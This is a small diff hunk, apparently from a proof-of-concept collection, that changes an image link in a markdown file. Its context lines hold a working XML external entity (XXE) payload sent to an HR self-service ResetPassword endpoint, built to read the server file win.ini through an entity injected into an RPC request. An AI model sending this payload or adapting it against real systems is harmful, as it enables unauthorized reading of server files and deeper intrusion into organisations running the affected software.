@@ -21,4 +21,4 @@ Content-Type: application/x-www-form-urlencoded
 
 __viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM "file:///C://windows//win.ini" >]><rpc transaction="10" method="resetPwd"><vps><p name="__profileKeys">%26Password;</p ></vps></rpc>
 ```
-![3a124b876c9485904654afbcc4d41771](https://github.com/wy876/POC/assets/139549762/bfe04702-24a5-435a-a67e-e26bfa9447c6)
+![3a124b876c9485904654afbcc4d41771](../../images/bfe04702-24a5-435a-a67e-e26bfa9447c6.png)
